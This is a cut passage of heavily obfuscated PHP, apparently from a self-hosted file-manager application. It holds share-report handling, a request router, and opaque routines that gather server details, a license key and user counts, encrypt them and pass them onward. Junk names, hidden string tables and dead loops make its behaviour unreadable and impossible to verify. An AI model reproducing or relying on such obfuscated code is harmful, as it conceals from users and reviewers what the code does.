"{$‰Œµ›üÅ}\x20{$ÃÎøÁ}"; return $this->order($£ÖÇ½á); } public function reportAdd($ßŞı®ÃÌ) { $Ù‘†ÉÆİ =& $_SERVER[¼’ç§¼´]; $ò§Ñë±û = array($Ù‘†ÉÆİ[679] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[679]], $Ù‘†ÉÆİ[1783] => USER_ID); if (Model($Ù‘†ÉÆİ[2158])->where($ò§Ñë±û)->find()) { return !1; } $ÛÄˆğÑŞ = array($Ù‘†ÉÆİ[679] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[679]], $Ù‘†ÉÆİ[1671] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[1671]], $Ù‘†ÉÆİ[193] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[193]], $Ù‘†ÉÆİ[552] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[552]], $Ù‘†ÉÆİ[1783] => USER_ID, $Ù‘†ÉÆİ[33] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[33]], $Ù‘†ÉÆİ[537] => $ßŞı®ÃÌ[$Ù‘†ÉÆİ[537]]); return Model($Ù‘†ÉÆİ[2158])->add($ÛÄˆğÑŞ); } public function reportList($…¾›ËÃø) { $º‚®ˆ°¢ =& $_SERVER[¼’ç§¼´]; $æÁ¨È×­ = array(); if ($…¾›ËÃø[$º‚®ˆ°¢[848]]) { $Ÿ¦â·ìğ = $…¾›ËÃø[$º‚®ˆ°¢[849]] ? $…¾›ËÃø[$º‚®ˆ°¢[849]] : strtotime(date($º‚®ˆ°¢[2160])); $æÁ¨È×­[$º‚®ˆ°¢[233]] = array($º‚®ˆ°¢[410], array($…¾›ËÃø[$º‚®ˆ°¢[848]], $Ÿ¦â·ìğ)); } if (isset($…¾›ËÃø[$º‚®ˆ°¢[33]]) && in_array($…¾›ËÃø[$º‚®ˆ°¢[33]], array($º‚®ˆ°¢[91], $º‚®ˆ°¢[521], $º‚®ˆ°¢[2163], $º‚®ˆ°¢[2164], $º‚®ˆ°¢[2165]))) { $æÁ¨È×­[$º‚®ˆ°¢[33]] = $…¾›ËÃø[$º‚®ˆ°¢[33]]; } if (isset($…¾›ËÃø[$º‚®ˆ°¢[838]]) && in_array($…¾›ËÃø[$º‚®ˆ°¢[838]], array($º‚®ˆ°¢[230], $º‚®ˆ°¢[91], $º‚®ˆ°¢[521], $º‚®ˆ°¢[2163]))) { $æÁ¨È×­[$º‚®ˆ°¢[838]] = $…¾›ËÃø[$º‚®ˆ°¢[838]]; } $ˆÂşË— = Input::get($º‚®ˆ°¢[542], $º‚®ˆ°¢[7], $º‚®ˆ°¢[2162], array($º‚®ˆ°¢[2079], $º‚®ˆ°¢[536])); $ª§»›¾Ç = array($º‚®ˆ°¢[534] => $º‚®ˆ°¢[535], $º‚®ˆ°¢[536] => $º‚®ˆ°¢[537]); $»†Ãå§ = $º‚®ˆ°¢[2166] . $ª§»›¾Ç[$ˆÂşË—]; $ßáà¹µŒ = Model($º‚®ˆ°¢[2158])->where($æÁ¨È×­)->order($»†Ãå§)->selectPage(20); if (empty($ßáà¹µŒ[$º‚®ˆ°¢[456]])) { return array(); } $Üİµ±½ = array_to_keyvalue_group($ßáà¹µŒ[$º‚®ˆ°¢[456]], $º‚®ˆ°¢[838], $º‚®ˆ°¢[679]); if (!empty($Üİµ±½[0])) { $…¾›ËÃø = $Üİµ±½[0]; $æÁ¨È×­ = array($º‚®ˆ°¢[679] => array($º‚®ˆ°¢[7], $…¾›ËÃø)); $±‚ÒÕ€¨ = $this->where($æÁ¨È×­)->field($º‚®ˆ°¢[679])->select(); $±‚ÒÕ€¨ = array_to_keyvalue($±‚ÒÕ€¨, $º‚®ˆ°¢[12], $º‚®ˆ°¢[679]); $†¯ã‰¨ = array_diff($…¾›ËÃø, $±‚ÒÕ€¨); if (!empty($†¯ã‰¨)) { foreach ($ßáà¹µŒ[$º‚®ˆ°¢[456]] as $ÅÓ³¢ªí => $åâ±»‚¼) { if (in_array($åâ±»‚¼[$º‚®ˆ°¢[679]], $†¯ã‰¨)) { unset($ßáà¹µŒ[$º‚®ˆ°¢[456]][$ÅÓ³¢ªí]); } } } } $this->_listDataApply($ßáà¹µŒ[$º‚®ˆ°¢[456]]); return $ßáà¹µŒ; } public function reportStatus($ü«‘‰²Å) { $ÅÚœæ¦É =& $_SERVER[¼’ç§¼´]; $È€ß±Ê = array($ÅÚœæ¦É[486] => $ü«‘‰²Å[$ÅÚœæ¦É[486]]); $Æ©÷²Â = Model($ÅÚœæ¦É[2158])->where($È€ß±Ê)->field($ÅÚœæ¦É[2167])->find(); if (!$Æ©÷²Â) { return !1; } $èì¬Ú¥ = array($ÅÚœæ¦É[838] => $ü«‘‰²Å[$ÅÚœæ¦É[838]]); if ($ü«‘‰²Å[$ÅÚœæ¦É[838]] == $ÅÚœæ¦É[2163] && $Æ©÷²Â[$ÅÚœæ¦É[838]] == $ÅÚœæ¦É[2163]) { $èì¬Ú¥[$ÅÚœæ¦É[838]] = 0; } $‘ÕªÜõÃ = Model($ÅÚœæ¦É[2158])->where($È€ß±Ê)->save($èì¬Ú¥); if ($ü«‘‰²Å[$ÅÚœæ¦É[838]] == $ÅÚœæ¦É[521]) { if ($Æ©÷²Â[$ÅÚœæ¦É[552]] != $ÅÚœæ¦É[230] && $this->shareFileMeta($Æ©÷²Â[$ÅÚœæ¦É[552]])) { $this->shareFileMeta($Æ©÷²Â[$ÅÚœæ¦É[552]], 0); } $this->remove($Æ©÷²Â[$ÅÚœæ¦É[679]]); return !0; } if ($‘ÕªÜõÃ && $ü«‘‰²Å[$ÅÚœæ¦É[838]] == $ÅÚœæ¦É[2163]) { $«î˜Ä€í = $èì¬Ú¥[$ÅÚœæ¦É[838]] == $ÅÚœæ¦É[2163] ? 1 : 0; $this->shareFileMeta($Æ©÷²Â[$ÅÚœæ¦É[552]], $«î˜Ä€í); $this->removeByFile($Æ©÷²Â[$ÅÚœæ¦É[552]]); } return $‘ÕªÜõÃ; } private function removeByFile($Òê‘ßÈ) { $”¾¦ğ  =& $_SERVER[¼’ç§¼´]; $Ë¹èæ = Model($”¾¦ğ [913])->where(array($”¾¦ğ [552] => $Òê‘ßÈ))->field($”¾¦ğ [193])->select(); $ÎÛ°ÀÏ– = array_to_keyvalue($Ë¹èæ, $”¾¦ğ [12], $”¾¦ğ [193]); $¿’Û¥Ó· = array($”¾¦ğ [193] => array($”¾¦ğ [7], $ÎÛ°ÀÏ–), $”¾¦ğ [573] => 1); $Ë¹èæ = $this->where($¿’Û¥Ó·)->field($”¾¦ğ [679])->select(); if (empty($Ë¹èæ)) { return; } $œÄÃ«­’ = array_to_keyvalue($Ë¹èæ, $”¾¦ğ [12], $”¾¦ğ [679]); $this->remove($œÄÃ«­’); } private function shareFileMeta($©öß³, $‹´è‘§Ë = null) { $øªŒïÉë =& $_SERVER[¼’ç§¼´]; $Ìú´Ï— = array($øªŒïÉë[552] => $©öß³, $øªŒïÉë[97] => $øªŒïÉë[2168]); if (is_null($‹´è‘§Ë)) { return Model($øªŒïÉë[2169])->where($Ìú´Ï—)->find(); } $Ìú´Ï—[$øªŒïÉë[461]] = $‹´è‘§Ë; Model($øªŒïÉë[2169])->add($Ìú´Ï—, array(), !0); } } goto dß‚Æ¯ÛÑ•; eÛâªç–™®: class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($ú°…°á ) { $¦âü×Êş =& $_SERVER[¼’ç§¼´]; $Áİ¾”ú‘ =& $_SERVER[©º°î³Ë]; $óü²»­İ = explode($Áİ¾”ú‘[0], trim($ú°…°á , $Áİ¾”ú‘[0])); $this->defaultModule = $óü²»­İ[0] ? $óü²»­İ[0] : $this->defaultModule; $öØ´ßœ = $¦âü×Êş[697]; while (strlen($öØ´ßœ) < $¦âü×Êş[698]) { if (!$öØ´ßœ) { break; } $öØ´ßœ++; } $this->defaultController = $óü²»­İ[1] ? $óü²»­İ[1] : $this->defaultController; $‘ ¯ƒëª = $¦âü×Êş[699]; $this->defaultAction = $óü²»­İ[2] ? $óü²»­İ[2] : $this->defaultAction; $this->yxrq1a2be9d0($Áİ¾”ú‘[1], array($this, $Áİ¾”ú‘[2])); } public function appRun($§¡÷¾¸Ò) { $Í¯¥ûšÂ =& $_SERVER[¼’ç§¼´]; $Ñ÷½€Áİ =& $_SERVER[©º°î³Ë]; $âÒšùé£ = explode($Ñ÷½€Áİ[0], $§¡÷¾¸Ò); $ø¢¤àÒ = $Í¯¥ûšÂ[700]; if (strlen($ø¢¤àÒ) < $Í¯¥ûšÂ[438]) { return; } $ºæÂæ‚´ = strtolower($âÒšùé£[0]); $ŸÛÎ ½Œ = $Í¯¥ûšÂ[701]; while ($ŸÛÎ ½Œ < $Í¯¥ûšÂ[702]) { if ($ŸÛÎ ½Œ >= 0) { break; } $ŸÛÎ ½Œ++; } $¹ÓŸÌ” = $Ñ÷½€Áİ[3]; $—’ÂÉ¤š = $Í¯¥ûšÂ[703]; if ($ºæÂæ‚´ == $Ñ÷½€Áİ[4]) { $¹ÓŸÌ” = $Ñ÷½€Áİ[5]; $âÒšùé£[0] = $Ñ÷½€Áİ[6]; $âÒšùé£[1] = $âÒšùé£[1] . $Ñ÷½€Áİ[7]; $§¡÷¾¸Ò = join($Ñ÷½€Áİ[0], $âÒšùé£); $§¡÷¾¸Ò = trim($§¡÷¾¸Ò, $Ñ÷½€Áİ[0]); } call_user_func(array($Ñ÷½€Áİ[8], $Ñ÷½€Áİ[9]), $¹ÓŸÌ” . $Ñ÷½€Áİ[10], $§¡÷¾¸Ò); ActionCall($§¡÷¾¸Ò); $ıÂ÷¤€¡ = $Í¯¥ûšÂ[704]; if (!$ıÂ÷¤€¡) { die; } call_user_func(array($Ñ÷½€Áİ[8], $Ñ÷½€Áİ[9]), $¹ÓŸÌ” . $Ñ÷½€Áİ[11], $§¡÷¾¸Ò); $ÜéÙ—ŸÙ = $Í¯¥ûšÂ[705]; if (strlen($ÜéÙ—ŸÙ) < $Í¯¥ûšÂ[706]) { die; } } private function autorun() { $èçßÑº† =& $_SERVER[©º°î³Ë]; global $config; if (count($config[$èçßÑº†[12]]) == 0) { return; } foreach ($config[$èçßÑº†[12]] as $„Í¸šİõ => $‡ö„ó ™) { $this->appRun($‡ö„ó ™); } } private function txji50c05e59() { $¨äô†Ûš =& $_SERVER[¼’ç§¼´]; $°ÖÈÊç =& $_SERVER[©º°î³Ë]; $Ó’úÍâ = $°ÖÈÊç[4]; $®æã ú² = $GLOBALS[$°ÖÈÊç[13]][$°ÖÈÊç[14]][0]; if (!$®æã ú² || strlen($®æã ú²) <= strlen($Ó’úÍâ)) { return; } if (strtolower(substr($®æã ú², -strlen($Ó’úÍâ))) != $Ó’úÍâ) { return; } $Š¼éÛÇÈ = substr($®æã ú², 0, -strlen($Ó’úÍâ)); $ø¦×”· = array($°ÖÈÊç[4], $Š¼éÛÇÈ); $…¼Ç»Õ = array_slice($GLOBALS[$°ÖÈÊç[13]][$°ÖÈÊç[14]], 1); $µ÷¸¶ = $¨äô†Ûš[707]; while (strlen($µ÷¸¶) < $¨äô†Ûš[702]) { if (!$µ÷¸¶) { break; } $µ÷¸¶++; } $GLOBALS[$°ÖÈÊç[13]][$°ÖÈÊç[14]] = array_merge($ø¦×”·, $…¼Ç»Õ); $GLOBALS[$°ÖÈÊç[13]][$°ÖÈÊç[15]] = implode($°ÖÈÊç[0], $GLOBALS[$°ÖÈÊç[13]][$°ÖÈÊç[14]]); } private function ecpkc2b33b8f() { $ì Á…ªø =& $_SERVER[¼’ç§¼´]; $Œşï˜–¼ =& $_SERVER[©º°î³Ë]; if ($GLOBALS[$Œşï˜–¼[13]][$Œşï˜–¼[15]] != $Œşï˜–¼[6]) { return; } $¼¦ß£…Ÿ = $_SERVER[$Œşï˜–¼[16]]; $¹Æ–Ö• = $ì Á…ªø[708]; while ($¹Æ–Ö• < $ì Á…ªø[698]) { if ($¹Æ–Ö• >= 0) { break; } $¹Æ–Ö•++; } $‰ë¿¯ñ© = $Œşï˜–¼[17]; if (!strstr($¼¦ß£…Ÿ, $‰ë¿¯ñ©)) { return; } $•êĞ¢ºà = strrpos($¼¦ß£…Ÿ, $‰ë¿¯ñ©); $È àãèÑ = $ì Á…ªø[709]; if (strlen($È àãèÑ) < $ì Á…ªø[698]) { return; } $ŸÅûï““ = substr($¼¦ß£…Ÿ, $•êĞ¢ºà + strlen($‰ë¿¯ñ©)); preg_match_all($Œşï˜–¼[18], $ŸÅûï““, $ªäÚÀ‘); $óˆÉ¢öÁ = $ì Á…ªø[710]; $ŸÅûï““ = trim($ªäÚÀ‘[0][0], $Œşï˜–¼[19]); $×ûüäº‹ = $ì Á…ªø[711]; if (!$×ûüäº‹) { die; } $GLOBALS[$Œşï˜–¼[13]][$Œşï˜–¼[14]] = explode($Œşï˜–¼[19], $ŸÅûï““); $GLOBALS[$Œşï˜–¼[13]][$Œşï˜–¼[15]] = implode($Œşï˜–¼[0], $GLOBALS[$Œşï˜–¼[13]][$Œşï˜–¼[14]]); $ÒÏü×«´ = $ì Á…ªø[712]; if (strlen($ÒÏü×«´) < $ì Á…ªø[438]) { return; } } public function run() { $€Ú–³™¼ =& $_SERVER[¼’ç§¼´]; $Üâªßş =& $_SERVER[©º°î³Ë]; $this->ecpkc2b33b8f(); $æ­‡÷• = $€Ú–³™¼[713]; while ($æ­‡÷• < $€Ú–³™¼[714]) { if ($æ­‡÷• >= 0) { break; } $æ­‡÷•++; } $this->txji50c05e59(); $Œø•ôë¨ = $€Ú–³™¼[715]; if (strlen($Œø•ôë¨) < $€Ú–³™¼[706]) { die; } $–ûú®ß¬ = $GLOBALS[$Üâªßş[13]][$Üâªßş[14]]; $¢¬‘´Òó = $€Ú–³™¼[716]; while (strlen($¢¬‘´Òó) < $€Ú–³™¼[438]) { if (!$¢¬‘´Òó) { break; } $¢¬‘´Òó++; } $íÙ’ƒüÏ = $GLOBALS[$Üâªßş[13]][$Üâªßş[15]]; $öÎœä˜¼ = $€Ú–³™¼[717]; if (!$öÎœä˜¼) { return; } define($Üâªßş[20], isset($–ûú®ß¬[0]) && $–ûú®ß¬[0] ? $–ûú®ß¬[0] : $this->defaultModule); define($Üâªßş[21], isset($–ûú®ß¬[1]) && $–ûú®ß¬[0] ? $–ûú®ß¬[1] : $this->defaultController); define($Üâªßş[22], isset($–ûú®ß¬[2]) && $–ûú®ß¬[0] ? $–ûú®ß¬[2] : $this->defaultAction); define($Üâªßş[23], MOD . $Üâªßş[0] . ST . $Üâªßş[0] . ACT); $ã‘„Õü = $€Ú–³™¼[718]; if (!$ã‘„Õü) { return; } $_SERVER[$Üâªßş[24]] = strtolower(ACTION); $ù×É»àª = $€Ú–³™¼[719]; while (strlen($ù×É»àª) < $€Ú–³™¼[702]) { if (!$ù×É»àª) { break; } $ù×É»àª++; } $this->autorun(); $é†¨î³Ä = $€Ú–³™¼[720]; while (strlen($é†¨î³Ä) < $€Ú–³™¼[706]) { if (!$é†¨î³Ä) { break; } $é†¨î³Ä++; } if (count($–ûú®ß¬) >= 3) { $this->appRun($íÙ’ƒüÏ); } else { $this->appRun(ACTION); } } private $nmwybea8b394 = array(); private $mhfi4e025a73 = ''; public function dpuz7d0e9beb() { $°ã¿Í© =& $_SERVER[¼’ç§¼´]; $¨Ôšñ‹õ =& $_SERVER[©º°î³Ë]; $this->phjc8a6fb92d(); $¸ö§ëŸĞ = $°ã¿Í©[721]; $this->iydo81ab7e5b(); $this->rlec20ea48f1(); $this->hers3c24a7cf(); $this->txkw6a3d8071(); $this->waqbc6de862c(); $°Ğö¥í¸ = $°ã¿Í©[722]; if (strlen($°Ğö¥í¸) < $°ã¿Í©[438]) { die; } $this->strucaca9856(); $ÉÖŠ¨ôë = $°ã¿Í©[723]; $this->yxrq1a2be9d0($¨Ôšñ‹õ[25], array($this, $¨Ôšñ‹õ[26])); $this->yxrq1a2be9d0($¨Ôšñ‹õ[27], array($this, $¨Ôšñ‹õ[28])); $ûÂú÷ = $°ã¿Í©[724]; while (strlen($ûÂú÷) < $°ã¿Í©[698]) { if (!$ûÂú÷) { break; } $ûÂú÷++; } $this->yxrq1a2be9d0($¨Ôšñ‹õ[29], array($this, $¨Ôšñ‹õ[30])); $ÖÖÍßî¨ = $°ã¿Í©[725]; if (strlen($ÖÖÍßî¨) < $°ã¿Í©[698]) { return; } $this->yxrq1a2be9d0($¨Ôšñ‹õ[31], array($this, $¨Ôšñ‹õ[32])); $ƒÃ¼ü• = $°ã¿Í©[726]; if (strlen($ƒÃ¼ü•) < $°ã¿Í©[438]) { return; } } public function hqrd2590f60f($øÀí™ìÜ) { $öÊíßÍ =& $_SERVER[¼’ç§¼´]; $ç²Ôõƒæ =& $_SERVER[©º°î³Ë]; $¢ÙÅÀÏ = Model($ç²Ôõƒæ[33])->get(); $û€ÑŸÒ = $öÊíßÍ[727]; if (!$û€ÑŸÒ) { return; } $ÚùĞº•Œ = array($ç²Ôõƒæ[34], $ç²Ôõƒæ[35], $ç²Ôõƒæ[36], $ç²Ôõƒæ[37], $ç²Ôõƒæ[38], $ç²Ôõƒæ[39], $ç²Ôõƒæ[40], $ç²Ôõƒæ[41], $ç²Ôõƒæ[42], $ç²Ôõƒæ[43], $ç²Ôõƒæ[44], $ç²Ôõƒæ[45], $ç²Ôõƒæ[46], $ç²Ôõƒæ[47], $ç²Ôõƒæ[48], $ç²Ôõƒæ[49], $ç²Ôõƒæ[50], $ç²Ôõƒæ[51], $ç²Ôõƒæ[52], $ç²Ôõƒæ[53], $ç²Ôõƒæ[54], $ç²Ôõƒæ[55], $ç²Ôõƒæ[56], $ç²Ôõƒæ[57], $ç²Ôõƒæ[58], $ç²Ôõƒæ[59], $ç²Ôõƒæ[60], $ç²Ôõƒæ[61], $ç²Ôõƒæ[62], $ç²Ôõƒæ[63], $ç²Ôõƒæ[64], $ç²Ôõƒæ[65], $ç²Ôõƒæ[66], $ç²Ôõƒæ[67], $ç²Ôõƒæ[68], $ç²Ôõƒæ[69], $ç²Ôõƒæ[70], $ç²Ôõƒæ[71], $ç²Ôõƒæ[72], $ç²Ôõƒæ[73], $ç²Ôõƒæ[74], $ç²Ôõƒæ[75], $ç²Ôõƒæ[76], $ç²Ôõƒæ[77], $ç²Ôõƒæ[78], $ç²Ôõƒæ[79], $ç²Ôõƒæ[80], $ç²Ôõƒæ[81], $ç²Ôõƒæ[82], $ç²Ôõƒæ[83], $ç²Ôõƒæ[84], $ç²Ôõƒæ[85]); $±âõ²¼ú = $öÊíßÍ[728]; if (strlen($±âõ²¼ú) < $öÊíßÍ[438]) { return; } foreach ($ÚùĞº•Œ as $±âÈƒèĞ) { $šÅ»ë»º = $GLOBALS[$ç²Ôõƒæ[86]][$ç²Ôõƒæ[87]][$±âÈƒèĞ]; if (isset($¢ÙÅÀÏ[$±âÈƒèĞ])) { $šÅ»ë»º = $¢ÙÅÀÏ[$±âÈƒèĞ]; } $øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$±âÈƒèĞ] = $šÅ»ë»º; } $â‘‰¸  = $øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$ç²Ôõƒæ[46]]; $ÇîÆƒ‰¯ = $öÊíßÍ[729]; if (strlen($ÇîÆƒ‰¯) < $öÊíßÍ[714]) { return; } unset($øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[90]][$ç²Ôõƒæ[91]]); $ïÏáúìî = $öÊíßÍ[730]; if (strlen($ïÏáúìî) < $öÊíßÍ[702]) { return; } unset($øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[90]][$ç²Ôõƒæ[92]]); $ô¡¾¥’  = $öÊíßÍ[731]; if (strlen($ô¡¾¥’ ) < $öÊíßÍ[706]) { return; } unset($øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$ç²Ôõƒæ[46]]); unset($øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$ç²Ôõƒæ[93]]); $øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$ç²Ôõƒæ[94]] = array($ç²Ôõƒæ[95] => (int) $â‘‰¸ [$ç²Ôõƒæ[96]], $ç²Ôõƒæ[97] => (int) _get($â‘‰¸ , $ç²Ôõƒæ[98], 0)); $‰¿Æ—Ù = substr(md5($ç²Ôõƒæ[99] . get_client_ip() . $¢ÙÅÀÏ[$ç²Ôõƒæ[100]]), 0, 15); $î’‚»ßº = $öÊíßÍ[732]; if (strlen($î’‚»ßº) < $öÊíßÍ[714]) { die; } $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[102]] = Mcrypt::encode(Session::sign(), $‰¿Æ—Ù, 3600 * 24); $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[103]] = Action($ç²Ôõƒæ[104])->accessToken(); $ÈÕêşÍ„ = $öÊíßÍ[733]; while (strlen($ÈÕêşÍ„) < $öÊíßÍ[698]) { if (!$ÈÕêşÍ„) { break; } $ÈÕêşÍ„++; } $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[105]] = md5($_SERVER[$ç²Ôõƒæ[106]] . $¢ÙÅÀÏ[$ç²Ôõƒæ[100]]); $àšğ”Çè = $öÊíßÍ[734]; if (strlen($àšğ”Çè) < $öÊíßÍ[706]) { die; } $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[107]] = base64_encode(serverInfo()); $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[108]] = $this->mhfi4e025a73; $™à¹ö÷× = $öÊíßÍ[735]; if (strlen($™à¹ö÷×) < $öÊíßÍ[706]) { die; } if ($¢ÙÅÀÏ[$ç²Ôõƒæ[108]] != $ç²Ôõƒæ[109]) { $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[110]] = $¢ÙÅÀÏ[$ç²Ôõƒæ[110]]; $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[111]] = $¢ÙÅÀÏ[$ç²Ôõƒæ[111]]; $®‚‡÷µØ = rand_string(10) . $this->mhfi4e025a73 . rand_string(5); $øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[112]][$ç²Ôõƒæ[113]] = $this->zxio34a3b682($®‚‡÷µØ, $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[105]]); } if ($this->mhfi4e025a73 == $ç²Ôõƒæ[109]) { $øÀí™ìÜ[$ç²Ôõƒæ[88]][$ç²Ôõƒæ[89]][$ç²Ôõƒæ[94]][$ç²Ôõƒæ[98]] = 0; } $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[114]] = $this->versionPluginFilter(); $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[115]] = _get($this->nmwybea8b394, $ç²Ôõƒæ[116], $ç²Ôõƒæ[6]); if (KodUser::isRoot() && $this->config[$ç²Ôõƒæ[117]]) { $øÀí™ìÜ[$ç²Ôõƒæ[101]][$ç²Ôõƒæ[118]] = WEB_ROOT; } return $øÀí™ìÜ; } private function waqbc6de862c() { $úØ® €“ =& $_SERVER[¼’ç§¼´]; $öáäËÉÖ =& $_SERVER[©º°î³Ë]; $Ä¢âÁŒÆ = $_SERVER[$öáäËÉÖ[24]] == $öáäËÉÖ[119]; $•ä·á„ = $úØ® €“[736]; if ($_SERVER[$öáäËÉÖ[24]] == $öáäËÉÖ[120] && $_GET[$öáäËÉÖ[121]] == $öáäËÉÖ[122]) { $Ä¢âÁŒÆ = !0; } if ($Ä¢âÁŒÆ) { $¡ÜìÍœ– = array($öáäËÉÖ[108] => $this->mhfi4e025a73, $öáäËÉÖ[123] => $this->ioayb6b7d6f1(), $öáäËÉÖ[124] => Model($öáäËÉÖ[125])->count()); if ($this->mhfi4e025a73 != $öáäËÉÖ[109]) { $¸’ï = _get($this->nmwybea8b394, $öáäËÉÖ[126]); if ($¸’ï) { $¡ÜìÍœ–[$öáäËÉÖ[127]] = $¸’ï; $¡ÜìÍœ–[$öáäËÉÖ[128]] = strtotime(_get($this->nmwybea8b394, $öáäËÉÖ[129])); $¡ÜìÍœ–[$öáäËÉÖ[130]] = _get($this->nmwybea8b394, $öáäËÉÖ[116]); } $¢ˆ¶Ó  = Model($öáäËÉÖ[33])->get($öáäËÉÖ[131], $öáäËÉÖ[6], !0); if (is_string($¢ˆ¶Ó ) && substr($¢ˆ¶Ó , 0, 1) == $öáäËÉÖ[132]) { $¢ˆ¶Ó  = json_decode_force($¢ˆ¶Ó ); } if (is_array($¢ˆ¶Ó ) && $¢ˆ¶Ó [$öáäËÉÖ[133]] && strstr($¢ˆ¶Ó [$öáäËÉÖ[133]], $öáäËÉÖ[134])) { $Ä©Ãêà“ = explode($öáäËÉÖ[134], $¢ˆ¶Ó [$öáäËÉÖ[133]]); $¡ÜìÍœ–[$öáäËÉÖ[135]] = $Ä©Ãêà“[0]; } } $¡ÜìÍœ– = $this->gyudb76f3552(json_encode($¡ÜìÍœ–), md5($öáäËÉÖ[136])); $­Ê¤Ÿ = $úØ® €“[737]; $‘ÂàøÃ¿ = array($öáäËÉÖ[137] => $¡ÜìÍœ–); call_user_func(array($öáäËÉÖ[138], $öáäËÉÖ[139]), $‘ÂàøÃ¿); $ÖÛé”ìœ = $úØ® €“[738]; while ($ÖÛé”ìœ < $úØ® €“[698]) { if ($ÖÛé”ìœ >= 0) { break; } $ÖÛé”ìœ++; } } if ($this->mhfi4e025a73 == $öáäËÉÖ[109]) { return; } $åÚ£‡ŒØ = array($öáäËÉÖ[140], $öáäËÉÖ[141], $öáäËÉÖ[142], $öáäËÉÖ[143], $öáäËÉÖ[144], $öáäËÉÖ[145]); $ÀÁ¿ÂÇ = Model($öáäËÉÖ[33])->get(); $‘ÂàøÃ¿ = array($öáäËÉÖ[146] => $ÀÁ¿ÂÇ[$öáäËÉÖ[34]], $öáäËÉÖ[147] => $ÀÁ¿ÂÇ[$öáäËÉÖ[35]], $öáäËÉÖ[148] => $öáäËÉÖ[6]); $¸âêë×Ù = $úØ® €“[739]; if (!$¸âêë×Ù) { return; } foreach ($åÚ£‡ŒØ as $¸¸ïöÇË) { if (!isset($ÀÁ¿ÂÇ[$¸¸ïöÇË]) || !$ÀÁ¿ÂÇ[$¸¸ïöÇË]) { continue; } $‘ÂàøÃ¿[$¸¸ïöÇË] = $ÀÁ¿ÂÇ[$¸¸ïöÇË]; $É“êİáÄ = $úØ® €“[740]; if (!$É“êİáÄ) { return; } } call_user_func(array($öáäËÉÖ[138], $öáäËÉÖ[139]), $‘ÂàøÃ¿); } private function hers3c24a7cf() { $ªËñèØ =& $_SERVER[¼’ç§¼´]; $İºİ¯î =& $_SERVER[©º°î³Ë]; if ($_SERVER[$İºİ¯î[24]] != $İºİ¯î[149]) { return; } if (!KodUser::isRoot()) { die; } $É‡¨ë™º = $GLOBALS[$İºİ¯î[13]]; if (isset($É‡¨ë™º[$İºİ¯î[150]])) { $this->vwecc553b9ed(); die; } if (isset($É‡¨ë™º[$İºİ¯î[151]]) && isset($É‡¨ë™º[$İºİ¯î[151]]) == $İºİ¯î[122]) { $É‡¨ë™º[$İºİ¯î[152]] = Model($İºİ¯î[33])->get($İºİ¯î[153]); } if (!isset($É‡¨ë™º[$İºİ¯î[152]]) || strlen($É‡¨ë™º[$İºİ¯î[152]]) != 16) { show_json($İºİ¯î[154] . $É‡¨ë™º[$İºİ¯î[152]], !1); } $‰ºï©ö¶ = Model($İºİ¯î[33])->get($İºİ¯î[100]); $úÍ…÷ = md5($_SERVER[$İºİ¯î[106]] . $‰ºï©ö¶); $Ø‚—È’ = array($İºİ¯î[152] => $É‡¨ë™º[$İºİ¯î[152]], $İºİ¯î[155] => rand_string(16), $İºİ¯î[156] => $İºİ¯î[136], $İºİ¯î[157] => $İºİ¯î[158], $İºİ¯î[159] => $_SERVER[$İºİ¯î[160]], $İºİ¯î[161] => $_SERVER[$İºİ¯î[162]], $İºİ¯î[163] => $_SERVER[$İºİ¯î[164]], $İºİ¯î[105] => $úÍ…÷, $İºİ¯î[165] => Model($İºİ¯î[33])->get($İºİ¯î[131])); $‚áÂÀÇ = $ªËñèØ[741]; if (strlen($‚áÂÀÇ) < $ªËñèØ[714]) { return; } if (isset($É‡¨ë™º[$İºİ¯î[151]]) && isset($É‡¨ë™º[$İºİ¯î[151]]) == $İºİ¯î[122]) { $Ø‚—È’[$İºİ¯î[151]] = md5($Ø‚—È’[$İºİ¯î[152]] . $İºİ¯î[166] . $Ø‚—È’[$İºİ¯î[155]]); } if ($É‡¨ë™º[$İºİ¯î[167]] == $İºİ¯î[168]) { $¢¯…Ò¥ê = $this->gyudb76f3552($úÍ…÷, $İºİ¯î[169]); $»ÅŸ½Î = $this->zxio34a3b682(json_encode($Ø‚—È’), $úÍ…÷ . $İºİ¯î[170], 3); $»ÅŸ½Î = $»ÅŸ½Î . $İºİ¯î[171] . $_SERVER[$İºİ¯î[160]]; $ÍØÇÍöÉ = $this->bsiwe707ae6d($İºİ¯î[172] . $¢¯…Ò¥ê . $İºİ¯î[173] . $»ÅŸ½Î, -1); show_json($ÍØÇÍöÉ, !0); } else { if ($É‡¨ë™º[$İºİ¯î[167]] == $İºİ¯î[174]) { $ÛïÒ‡ºñ = substr(md5($İºİ¯î[175] . $úÍ…÷), 12, 15) . $İºİ¯î[176]; $»ÅŸ½Î = 